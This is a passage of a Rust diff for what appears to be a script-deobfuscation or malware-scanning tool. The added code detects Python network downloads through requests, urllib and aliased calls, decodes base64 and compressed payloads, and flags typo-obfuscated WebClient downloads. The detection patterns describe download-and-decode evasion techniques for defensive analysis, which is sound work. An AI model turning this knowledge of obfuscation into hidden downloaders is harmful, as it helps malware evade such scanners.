+fn find_python_requests_request_literals(text: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut names = vec!["requests.request".to_string()];
+    names.extend(collect_python_requests_call_aliases(text, "request"));
+    names.extend(collect_python_requests_assigned_method_aliases(
+        text, "request",
+    ));
+    names.extend(collect_python_requests_session_method_aliases(
+        text, "request",
+    ));
+    names.extend(collect_python_requests_bound_session_method_aliases(
+        text, "request",
+    ));
+    names.extend(collect_python_requests_bound_session_assigned_method_aliases(text, "request"));
+    let mut call_sites = Vec::new();
+    for name in names {
+        let mut search_start = 0;
+        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
+            let name_end = name_start + name.len();
+            if !is_callable_name_boundary(text, name_start, name_end) {
+                search_start = name_end;
+                continue;
+            }
+            let open = skip_ascii_ws(text, name_end);
+            if text.as_bytes().get(open) != Some(&b'(') {
+                search_start = name_end;
+                continue;
+            }
+            let Some(close) = find_matching_paren(text, open) else {
+                search_start = open + 1;
+                continue;
+            };
+            call_sites.push((open, close));
+            search_start = close + 1;
+        }
+    }
+    if call_sites.is_empty() {
+        return found;
+    }
+
+    let string_bindings = collect_python_string_bindings(text);
+    let url_bindings = collect_python_url_string_bindings_from(&string_bindings);
+
+    for (open, close) in call_sites {
+        if let Some(url) =
+            python_requests_request_url(&text[open + 1..close], &url_bindings, &string_bindings)
+        {
+            found.push(url);
+        }
+    }
+
+    found
+}
+
+fn python_requests_request_url(
+    args: &str,
+    url_bindings: &HashMap<String, String>,
+    string_bindings: &HashMap<String, String>,
+) -> Option<String> {
+    let parts = split_python_top_level_args(args);
+    if !python_requests_request_method_is_supported(&parts, string_bindings) {
+        return None;
+    }
+
+    if let Some(url) = python_keyword_url_arg(&parts, "url", url_bindings) {
+        return Some(url);
+    }
+
+    let method_is_keyword = parts.iter().any(|arg| python_arg_is_keyword(arg, "method"));
+    let mut positional_args = parts
+        .into_iter()
+        .take(4)
+        .filter(|arg| !python_arg_has_keyword(arg));
+    if !method_is_keyword {
+        positional_args.next();
+    }
+    positional_args
+        .next()
+        .and_then(|arg| python_url_arg_expr(arg, url_bindings))
+}
+
+fn python_requests_request_method_is_supported(
+    parts: &[&str],
+    bindings: &HashMap<String, String>,
+) -> bool {
+    if let Some(method) = python_keyword_string_arg(parts, "method", bindings) {
+        return is_python_requests_download_method(&method);
+    }
+    parts
+        .first()
+        .and_then(|arg| python_string_arg(arg, bindings))
+        .is_some_and(|method| is_python_requests_download_method(&method))
+}
+
+fn is_python_requests_download_method(method: &str) -> bool {
+    matches!(
+        method.to_ascii_uppercase().as_str(),
+        "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS"
+    )
+}
+
+fn python_arg_is_keyword(arg: &str, keyword: &str) -> bool {
+    arg.split_once('=')
+        .is_some_and(|(key, _)| key.trim().eq_ignore_ascii_case(keyword))
+}
+
+fn python_arg_has_keyword(arg: &str) -> bool {
+    arg.split_once('=')
+        .is_some_and(|(key, _)| is_python_identifier(key.trim()))
+}
+
+fn decoded_python_b64decode_literals(deobfuscated: &str) -> Vec<String> {
+    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            &format!(
+                r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
+            ),
+        )
+            .expect("python b64decode literal regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:base64|__import__\(\s*['"]base64['"]\s*\))\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
+        )
+            .expect("python b64decode variable regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_MODULE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            &format!(
+                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
+            ),
+        )
+        .expect("python b64decode module alias literal regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_MODULE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
+        )
+        .expect("python b64decode module alias variable regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_ALIAS_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            &format!(
+                r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]\s*([^)]{{0,128}})\)"#
+            ),
+        )
+        .expect("python b64decode alias literal regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_B64DECODE_ALIAS_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*([^)]{0,128})\)"#,
+        )
+        .expect("python b64decode alias variable regex")
+    });
+
+    let mut out = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+    for caps in PY_B64DECODE_LITERAL_RE.captures_iter(deobfuscated).take(16) {
+        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !(32..=20_000).contains(&b64.len()) {
+            continue;
+        }
+        if !is_python_base64_literal(b64) {
+            continue;
+        }
+        let has_urlsafe_altchars = caps
+            .get(3)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+
+    let bindings = collect_python_b64_string_bindings(deobfuscated);
+    let module_aliases = collect_python_base64_module_aliases(deobfuscated);
+    let decoder_aliases = collect_python_base64_decoder_aliases(deobfuscated, &module_aliases);
+    for caps in PY_B64DECODE_VAR_RE.captures_iter(deobfuscated).take(16) {
+        let Some(method) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(name) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(b64) = bindings.get(name).map(String::as_str) else {
+            continue;
+        };
+        let has_urlsafe_altchars = caps
+            .get(3)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+
+    for caps in PY_B64DECODE_MODULE_ALIAS_LITERAL_RE
+        .captures_iter(deobfuscated)
+        .take(32)
+    {
+        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !module_aliases.contains(module_name) {
+            continue;
+        }
+        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(b64) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+        let has_urlsafe_altchars = caps
+            .get(4)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+
+    for caps in PY_B64DECODE_MODULE_ALIAS_VAR_RE
+        .captures_iter(deobfuscated)
+        .take(32)
+    {
+        let Some(module_name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !module_aliases.contains(module_name) {
+            continue;
+        }
+        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(var_name) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
+            continue;
+        };
+        let has_urlsafe_altchars = caps
+            .get(4)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+
+    for caps in PY_B64DECODE_ALIAS_LITERAL_RE
+        .captures_iter(deobfuscated)
+        .take(32)
+    {
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
+            continue;
+        };
+        let Some(b64) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let has_urlsafe_altchars = caps
+            .get(3)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+
+    for caps in PY_B64DECODE_ALIAS_VAR_RE
+        .captures_iter(deobfuscated)
+        .take(32)
+    {
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(method) = decoder_aliases.get(name).map(String::as_str) else {
+            continue;
+        };
+        let Some(var_name) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(b64) = bindings.get(var_name).map(String::as_str) else {
+            continue;
+        };
+        let has_urlsafe_altchars = caps
+            .get(3)
+            .is_some_and(|m| python_b64_suffix_has_urlsafe_altchars(m.as_str()));
+        decode_python_b64_payload(method, b64, has_urlsafe_altchars, &mut out, &mut seen);
+    }
+    out
+}
+
+fn collect_python_base64_module_aliases(deobfuscated: &str) -> std::collections::HashSet<String> {
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_BASE64_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+base64\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python import base64 alias regex")
+    });
+
+    let mut aliases = std::collections::HashSet::new();
+    aliases.insert("base64".to_string());
+    for caps in PY_IMPORT_BASE64_ALIAS_RE
+        .captures_iter(deobfuscated)
+        .take(16)
+    {
+        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        aliases.insert(alias.to_string());
+    }
+    aliases
+}
+
+fn collect_python_base64_decoder_aliases(
+    deobfuscated: &str,
+    module_aliases: &std::collections::HashSet<String>,
+) -> std::collections::HashMap<String, String> {
+    #[allow(clippy::expect_used)]
+    static PY_FROM_BASE64_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bfrom\s+base64\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python from base64 import regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(b64decode|urlsafe_b64decode)\b"#,
+        )
+        .expect("python base64 decoder assignment regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*__import__\(\s*['"]base64['"]\s*\)\.(b64decode|urlsafe_b64decode)\b"#,
+        )
+        .expect("python __import__ base64 decoder assignment regex")
+    });
+
+    let mut aliases = std::collections::HashMap::new();
+    for caps in PY_FROM_BASE64_IMPORT_RE.captures_iter(deobfuscated).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            if part == "*" {
+                aliases.insert("b64decode".to_string(), "b64decode".to_string());
+                aliases.insert(
+                    "urlsafe_b64decode".to_string(),
+                    "urlsafe_b64decode".to_string(),
+                );
+                continue;
+            }
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(method) = words.first().copied() else {
+                continue;
+            };
+            if !matches!(method, "b64decode" | "urlsafe_b64decode") {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(method)
+            } else {
+                method
+            };
+            if is_python_identifier(alias) {
+                aliases.insert(alias.to_string(), method.to_string());
+            }
+        }
+    }
+    for caps in PY_BASE64_DECODER_ASSIGN_RE
+        .captures_iter(deobfuscated)
+        .take(16)
+    {
+        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !is_python_identifier(alias) {
+            continue;
+        }
+        let Some(module_name) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !module_aliases.contains(module_name) {
+            continue;
+        }
+        let Some(method) = caps.get(3).map(|m| m.as_str()) else {
+            continue;
+        };
+        aliases.insert(alias.to_string(), method.to_string());
+    }
+    for caps in PY_DUNDER_IMPORT_BASE64_DECODER_ASSIGN_RE
+        .captures_iter(deobfuscated)
+        .take(16)
+    {
+        let Some(alias) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !is_python_identifier(alias) {
+            continue;
+        }
+        let Some(method) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        aliases.insert(alias.to_string(), method.to_string());
+    }
+    aliases
+}
+
+fn collect_python_b64_string_bindings(
+    deobfuscated: &str,
+) -> std::collections::HashMap<String, String> {
+    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
+    #[allow(clippy::expect_used)]
+    static PY_STRING_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            &format!(
+                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*{PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#
+            ),
+        )
+        .expect("python string binding regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_STRING_CONCAT_BINDING_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            &format!(
+                r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*({PY_STRING_PREFIX_RE}['"][^'"]+['"](?:\s*(?:\+\s*)?{PY_STRING_PREFIX_RE}['"][^'"]+['"])*)"#
+            ),
+        )
+        .expect("python string concat binding regex")
+    });
+
+    let mut bindings = std::collections::HashMap::new();
+    for caps in PY_STRING_BINDING_RE.captures_iter(deobfuscated).take(64) {
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(value) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(value) {
+            continue;
+        }
+        bindings.insert(name.to_string(), value.to_string());
+    }
+    for caps in PY_STRING_CONCAT_BINDING_RE
+        .captures_iter(deobfuscated)
+        .take(32)
+    {
+        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(expr) = caps.get(2).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(value) = collect_python_concat_string_literals(expr) else {
+            continue;
+        };
+        if !(32..=20_000).contains(&value.len()) || !is_python_base64_literal(&value) {
+            continue;
+        }
+        bindings.insert(name.to_string(), value);
+    }
+    bindings
+}
+
+fn collect_python_concat_string_literals(expr: &str) -> Option<String> {
+    const PY_STRING_PREFIX_RE: &str = r#"(?:[rRuU]|[bB]|[rR][bB]|[bB][rR])?"#;
+    #[allow(clippy::expect_used)]
+    static PY_STRING_LITERAL_PART_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(&format!(r#"(?is){PY_STRING_PREFIX_RE}['"]([^'"]+)['"]"#))
+            .expect("python string literal part regex")
+    });
+
+    let mut out = String::new();
+    let mut parts = 0usize;
+    for caps in PY_STRING_LITERAL_PART_RE.captures_iter(expr).take(64) {
+        let Some(value) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        out.push_str(value);
+        parts += 1;
+        if out.len() > 20_000 {
+            return None;
+        }
+    }
+    (parts >= 2).then_some(out)
+}
+
+fn is_python_identifier(s: &str) -> bool {
+    let mut chars = s.chars();
+    let Some(first) = chars.next() else {
+        return false;
+    };
+    (first == '_' || first.is_ascii_alphabetic())
+        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
+}
+
+fn decode_python_b64_payload(
+    method: &str,
+    b64: &str,
+    has_urlsafe_altchars: bool,
+    out: &mut Vec<String>,
+    seen: &mut std::collections::HashSet<String>,
+) {
+    use base64::Engine;
+
+    if !(32..=20_000).contains(&b64.len()) {
+        return;
+    }
+    if !is_python_base64_literal(b64) {
+        return;
+    }
+    if !seen.insert(b64.to_string()) {
+        return;
+    }
+    let decoded = if method.eq_ignore_ascii_case("urlsafe_b64decode") || has_urlsafe_altchars {
+        base64::engine::general_purpose::URL_SAFE
+            .decode(b64)
+            .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(b64))
+    } else {
+        base64::engine::general_purpose::STANDARD.decode(b64)
+    };
+    let Ok(decoded) = decoded else {
+        return;
+    };
+    out.extend(decoded_python_literal_payloads(&decoded));
+}
+
+fn decoded_python_literal_payloads(decoded: &[u8]) -> Vec<String> {
+    let mut out = Vec::new();
+    if decoded.len() <= 64 * 1024 {
+        if let Ok(text) = std::str::from_utf8(decoded) {
+            out.push(text.to_string());
+        }
+    }
+    if let Some(text) = inflate_python_literal_zlib(decoded) {
+        out.push(text);
+    }
+    if let Some(text) = inflate_python_literal_gzip(decoded) {
+        out.push(text);
+    }
+    out
+}
+
+fn inflate_python_literal_zlib(decoded: &[u8]) -> Option<String> {
+    python_bounded_inflate(flate2::read::ZlibDecoder::new(decoded))
+}
+
+fn inflate_python_literal_gzip(decoded: &[u8]) -> Option<String> {
+    python_bounded_inflate(flate2::read::GzDecoder::new(decoded))
+}
+
+fn python_bounded_inflate<R: std::io::Read>(reader: R) -> Option<String> {
+    use std::io::Read as _;
+
+    const MAX_DECOMPRESSED_BYTES: u64 = 64 * 1024;
+
+    let mut limited = reader.take(MAX_DECOMPRESSED_BYTES + 1);
+    let mut bytes = Vec::new();
+    limited.read_to_end(&mut bytes).ok()?;
+    if bytes.len() as u64 > MAX_DECOMPRESSED_BYTES {
+        return None;
+    }
+    String::from_utf8(bytes).ok()
+}
+
+fn is_python_base64_literal(s: &str) -> bool {
+    s.chars()
+        .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '_' | '-' | '='))
+}
+
+fn python_b64_suffix_has_urlsafe_altchars(suffix: &str) -> bool {
+    #[allow(clippy::expect_used)]
+    static PY_B64_ALTCHARS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)^\s*,\s*(?:altchars\s*=\s*)?(?:[bB])?['"]-_['"]\s*$"#)
+            .expect("python b64 altchars regex")
+    });
+
+    PY_B64_ALTCHARS_RE.is_match(suffix)
 }
 
 fn emit_python_download(
     url: &str,
+    deobfuscated: &str,
+    env: &mut Environment,
+    known: &mut std::collections::HashSet<String>,
+) {
+    emit_python_download_with_dst(url, None, deobfuscated, env, known);
+}
+
+fn emit_python_download_with_dst(
+    url: &str,
+    dst: Option<&str>,
     deobfuscated: &str,
     env: &mut Environment,
     known: &mut std::collections::HashSet<String>,
@@ -540,11 +1904,15 @@ fn emit_python_download(
     env.traits.push(Trait::Download {
         cmd: line_hint,
         src: url,
-        dst: None,
+        dst: dst.map(str::to_string),
     });
 }
 
 fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
+    if !has_typo_webclient_download_atom(deobfuscated) {
+        return;
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -568,8 +1936,44 @@ fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn has_typo_webclient_download_atom(text: &str) -> bool {
+    let has_url = [
+        b"http:".as_slice(),
+        b"https:".as_slice(),
+        b"ftp:".as_slice(),
+        b"file:".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom));
+    if !has_url {
+        return false;
+    }
+
+    [
+        b"download".as_slice(),
+        b"dwnload".as_slice(),
+        b"wnload".as_slice(),
+        b"ownload".as_slice(),
+        b"down".as_slice(),
+        b"ebc".as_slice(),
+    ]
+    .iter()
+    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
+}
+
+fn contains_ascii_case_insensitive_atom(text: &str, atom: &[u8]) -> bool {
+    !atom.is_empty()
+        && text.as_bytes().windows(atom.len()).any(|window| {
+            window
+                .iter()
+                .zip(atom)
+                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
+        })
+}
+
 fn find_call_url_literals(text: &str, names: &[&str]) -> Vec<String> {
     let mut found = Vec::new();
+    let mut call_sites = Vec::new();
     for name in names {
         let mut search_start = 0;
         while let Some(name_start) = find_ascii_case_insensitive(text, name, search_start) {
@@ -587,13 +1991,349 @@ fn find_call_url_literals(text: &str, names: &[&str]) -> Vec<String> {
                 search_start = open + 1;
                 continue;
             };
-            if let Some(url) = first_url_literal(&text[open + 1..close]) {
-                found.push(url);
+            call_sites.push((open, close));
+            search_start = close + 1;
+        }
+    }
+    if call_sites.is_empty() {
+        return found;
+    }
+
+    let empty_bindings = HashMap::new();
+    let mut bindings = None;
+    for (open, close) in call_sites {
+        let args = &text[open + 1..close];
+        if let Some(url) = first_python_url_arg(args, &empty_bindings).or_else(|| {
+            let bindings = bindings.get_or_insert_with(|| {
+                let string_bindings = collect_python_string_bindings(text);
+                let mut bindings = collect_python_url_string_bindings_from(&string_bindings);
+                bindings.extend(collect_python_urllib_request_object_url_bindings(
+                    text, &bindings,
+                ));
+                bindings
+            });
+            first_python_url_arg(args, bindings)
+        }) {
+            found.push(url);
+        }
+    }
+    found
+}
+
+fn collect_python_urllib_request_object_url_bindings(
+    text: &str,
+    url_bindings: &HashMap<String, String>,
+) -> HashMap<String, String> {
+    let mut found = HashMap::new();
+    let mut names = vec![
+        "urllib.request.Request".to_string(),
+        "urllib.Request".to_string(),
+    ];
+    names.extend(collect_python_urllib_call_aliases(text, "Request"));
+    for name in names {
+        let mut search_start = 0;
+        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
+            let name_end = name_start + name.len();
+            if !is_callable_name_boundary(text, name_start, name_end) {
+                search_start = name_end;
+                continue;
+            }
+            let Some(lhs) = python_assignment_lhs_before(text, name_start) else {
+                search_start = name_end;
+                continue;
+            };
+            let open = skip_ascii_ws(text, name_end);
+            if text.as_bytes().get(open) != Some(&b'(') {
+                search_start = name_end;
+                continue;
+            }
+            let Some(close) = find_matching_paren(text, open) else {
+                search_start = open + 1;
+                continue;
+            };
+            if let Some(url) = first_python_url_arg(&text[open + 1..close], url_bindings) {
+                found.insert(lhs, url);
             }
             search_start = close + 1;
         }
     }
     found
+}
+
+fn python_assignment_lhs_before(text: &str, expr_start: usize) -> Option<String> {
+    let prefix = text.get(..expr_start)?.trim_end();
+    let before_eq = prefix.strip_suffix('=')?.trim_end();
+    let ident_start = before_eq
+        .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+        .map_or(0, |idx| idx + 1);
+    let ident = before_eq.get(ident_start..)?.trim();
+    is_python_identifier(ident).then(|| ident.to_string())
+}
+
+fn find_python_urlretrieve_literals(text: &str) -> Vec<(String, Option<String>)> {
+    let mut found = Vec::new();
+    let mut names = vec![
+        "urllib.request.urlretrieve".to_string(),
+        "urllib.urlretrieve".to_string(),
+    ];
+    names.extend(collect_python_urllib_call_aliases(text, "urlretrieve"));
+    let mut call_sites = Vec::new();
+    for name in names {
+        let mut search_start = 0;
+        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
+            let name_end = name_start + name.len();
+            if !is_callable_name_boundary(text, name_start, name_end) {
+                search_start = name_end;
+                continue;
+            }
+            let open = skip_ascii_ws(text, name_end);
+            if text.as_bytes().get(open) != Some(&b'(') {
+                search_start = name_end;
+                continue;
+            }
+            let Some(close) = find_matching_paren(text, open) else {
+                search_start = open + 1;
+                continue;
+            };
+            call_sites.push((open, close));
+            search_start = close + 1;
+        }
+    }
+    if call_sites.is_empty() {
+        return found;
+    }
+
+    let string_bindings = collect_python_string_bindings(text);
+    let url_bindings = collect_python_url_string_bindings_from(&string_bindings);
+    for (open, close) in call_sites {
+        if let Some((url, dst)) = python_urlretrieve_download_args(
+            &text[open + 1..close],
+            &url_bindings,
+            &string_bindings,
+        ) {
+            found.push((url, dst));
+        }
+    }
+    found
+}
+
+fn python_urlretrieve_download_args(
+    args: &str,
+    url_bindings: &HashMap<String, String>,
+    string_bindings: &HashMap<String, String>,
+) -> Option<(String, Option<String>)> {
+    let parts = split_python_top_level_args(args);
+    if let Some((idx, url)) = parts
+        .iter()
+        .take(4)
+        .enumerate()
+        .find_map(|(idx, arg)| first_url_literal(arg).map(|url| (idx, url)))
+    {
+        let dst = parts
+            .iter()
+            .skip(idx + 1)
+            .find_map(|part| python_string_arg(part, string_bindings))
+            .or_else(|| python_keyword_string_arg(&parts, "filename", string_bindings));
+        return Some((url, dst));
+    }
+
+    parts.iter().take(4).enumerate().find_map(|(idx, arg)| {
+        let url = python_url_arg_from_binding(arg, url_bindings)?;
+        let dst = parts
+            .iter()
+            .skip(idx + 1)
+            .find_map(|part| python_string_arg(part, string_bindings))
+            .or_else(|| python_keyword_string_arg(&parts, "filename", string_bindings));
+        Some((url, dst))
+    })
+}
+
+fn python_string_arg(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
+    python_string_literal_arg(arg).or_else(|| python_string_arg_from_binding(arg, bindings))
+}
+
+fn python_string_literal_arg(arg: &str) -> Option<String> {
+    let expr = if let Some((key, value)) = arg.split_once('=') {
+        if is_python_identifier(key.trim()) {
+            value
+        } else {
+            arg
+        }
+    } else {
+        arg
+    };
+    if let Some(literal) = python_adjacent_string_literal_expr(expr) {
+        return (!looks_like_direct_url(trim_url_suffix(&literal))).then_some(literal);
+    }
+    python_quoted_literals(expr)
+        .into_iter()
+        .find(|literal| !looks_like_direct_url(trim_url_suffix(literal)))
+}
+
+fn python_string_arg_from_binding(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
+    let expr = if let Some((key, value)) = arg.split_once('=') {
+        if is_python_identifier(key.trim()) {
+            value
+        } else {
+            arg
+        }
+    } else {
+        arg
+    };
+    let expr = expr.trim();
+    let (ident, ident_end) = parse_ascii_ident(expr, 0)?;
+    if skip_ascii_ws(expr, ident_end) != expr.len() {
+        return None;
+    }
+    bindings
+        .get(&ident)
+        .filter(|value| !looks_like_direct_url(trim_url_suffix(value)))
+        .cloned()
+}
+
+fn python_keyword_string_arg(
+    parts: &[&str],
+    keyword: &str,
+    bindings: &HashMap<String, String>,
+) -> Option<String> {
+    parts.iter().find_map(|part| {
+        let (key, value) = part.split_once('=')?;
+        key.trim()
+            .eq_ignore_ascii_case(keyword)
+            .then(|| python_string_arg(value, bindings))?
+    })
+}
+
+fn collect_python_urllib_call_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"urllib")
+        && !contains_ascii_case_insensitive_atom(text, target_method.as_bytes())
+    {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_FROM_URLLIB_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)\bfrom\s+urllib(?:\.request)?\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#,
+        )
+        .expect("python urllib import regex")
+    });
+    let mut aliases = Vec::new();
+    for alias in collect_python_urllib_request_module_aliases(text)
+        .into_iter()
+        .filter(|alias| alias != "urllib.request")
+    {
+        aliases.push(format!("{alias}.{target_method}"));
+    }
+    aliases.extend(collect_python_urllib_assigned_call_aliases(
+        text,
+        target_method,
+    ));
+    for caps in PY_FROM_URLLIB_IMPORT_RE.captures_iter(text).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(method) = words.first().copied() else {
+                continue;
+            };
+            if method != target_method {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(method)
+            } else {
+                method
+            };
+            if is_python_identifier(alias) {
+                aliases.push(alias.to_string());
+            }
+        }
+    }
+    aliases
+}
+
+fn collect_python_urllib_request_module_aliases(text: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"urllib") {
+        return vec!["urllib.request".to_string()];
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_URLLIB_REQUEST_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+urllib\.request\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python urllib.request import alias regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_FROM_URLLIB_REQUEST_MODULE_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
